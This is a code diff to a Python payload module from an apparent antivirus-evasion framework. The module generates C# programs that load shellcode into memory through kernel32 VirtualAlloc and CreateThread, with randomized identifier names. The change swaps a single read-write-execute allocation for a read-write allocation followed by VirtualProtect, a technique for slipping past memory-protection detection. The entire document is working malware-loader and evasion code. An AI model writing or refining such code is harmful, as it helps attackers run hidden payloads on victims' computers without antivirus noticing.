@@ -77,17 +77,19 @@ class PayloadModule:
         hThreadName = evasion_helpers.randomString()
         threadIdName = evasion_helpers.randomString()
         pinfoName = evasion_helpers.randomString()
+        rand_bool = evasion_helpers.randomString()
+        random_out = evasion_helpers.randomString()
         num_tabs_required = 0
 
         # get 12 random variables for the API imports
-        r = [evasion_helpers.randomString() for x in range(12)]
+        r = [evasion_helpers.randomString() for x in range(16)]
         y = [evasion_helpers.randomString() for x in range(17)]
 
         #required syntax at the beginning of any/all payloads
         payload_code = "using System; using System.Net; using System.Net.Sockets; using System.Runtime.InteropServices; using System.Threading;\n"
         payload_code += "namespace %s { class %s  {\n" % (namespaceName, className)
         if self.required_options["INJECT_METHOD"][0].lower() == "virtual":
-            payload_code += """\t\t[DllImport(\"kernel32\")] private static extern UInt32 VirtualAlloc(UInt32 %s,UInt32 %s, UInt32 %s, UInt32 %s);\n[DllImport(\"kernel32\")]private static extern IntPtr CreateThread(UInt32 %s, UInt32 %s, UInt32 %s,IntPtr %s, UInt32 %s, ref UInt32 %s);\n[DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr %s, UInt32 %s);\n"""%(r[0],r[1],r[2],r[3],r[4],r[5],r[6],r[7],r[8],r[9],r[10],r[11])
+            payload_code += """\t\t[DllImport(\"kernel32\")] private static extern IntPtr VirtualAlloc(UInt32 %s,UInt32 %s, UInt32 %s, UInt32 %s);\n[DllImport(\"kernel32\")] public static extern bool VirtualProtect(IntPtr %s, uint %s, uint %s, out uint %s);\n[DllImport(\"kernel32\")]private static extern IntPtr CreateThread(UInt32 %s, UInt32 %s, IntPtr %s,IntPtr %s, UInt32 %s, ref UInt32 %s);\n[DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr %s, UInt32 %s);\n"""%(r[0],r[1],r[2],r[3],r[4],r[5],r[6],r[7],r[8],r[9],r[10],r[11], r[12], r[13], r[14], r[15])
         elif self.required_options["INJECT_METHOD"][0].lower() == "heap":
             payload_code += """\t\t[DllImport(\"kernel32\")] private static extern UInt32 HeapCreate(UInt32 %s, UInt32 %s, UInt32 %s); \n[DllImport(\"kernel32\")] private static extern UInt32 HeapAlloc(UInt32 %s, UInt32 %s, UInt32 %s);\n[DllImport(\"kernel32\")] private static extern UInt32 RtlMoveMemory(UInt32 %s, byte[] %s, UInt32 %s);\n[DllImport(\"kernel32\")] private static extern IntPtr CreateThread(UInt32 %s, UInt32 %s, UInt32 %s, IntPtr %s, UInt32 %s, ref UInt32 %s);\n[DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr %s, UInt32 %s);"""%(y[0],y[1],y[2],y[3],y[4],y[5],y[6],y[7],y[8],y[9],y[10],y[11],y[12],y[13],y[14],y[15],y[16])
         payload_code += "static void Main() {\n"
@@ -99,9 +101,11 @@ class PayloadModule:
         if self.required_options["INJECT_METHOD"][0].lower() == "virtual":
             payload_code += '\t' * num_tabs_required + "byte[] %s = {%s};" % (bytearrayName, Shellcode)
 
-            payload_code += '\t' * num_tabs_required + "UInt32 %s = VirtualAlloc(0, (UInt32)%s.Length, 0x1000, 0x40);\n" % (funcAddrName, bytearrayName)
+            payload_code += '\t' * num_tabs_required + "IntPtr %s = VirtualAlloc(0, (UInt32)%s.Length, 0x3000, 0x04);\n" % (funcAddrName, bytearrayName)
             payload_code += '\t' * num_tabs_required + "Marshal.Copy(%s, 0, (IntPtr)(%s), %s.Length);\n" % (bytearrayName, funcAddrName, bytearrayName)
             payload_code += '\t' * num_tabs_required + "IntPtr %s = IntPtr.Zero; UInt32 %s = 0; IntPtr %s = IntPtr.Zero;\n" %(hThreadName, threadIdName, pinfoName)
+            payload_code += '\t' * num_tabs_required + "uint %s;\n" %(random_out)
+            payload_code += '\t' * num_tabs_required + "bool %s = VirtualProtect(%s, (uint)0x1000, (uint)0x20, out %s);\n" %(rand_bool, funcAddrName, random_out)
             payload_code += '\t' * num_tabs_required + "%s = CreateThread(0, 0, %s, %s, 0, ref %s);\n" % (hThreadName, funcAddrName, pinfoName, threadIdName)
             payload_code += '\t' * num_tabs_required + "WaitForSingleObject(%s, 0xFFFFFFFF);}\n" % (hThreadName)
             # payload_code += "private static UInt32 MEM_COMMIT = 0x1000; private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;\n"
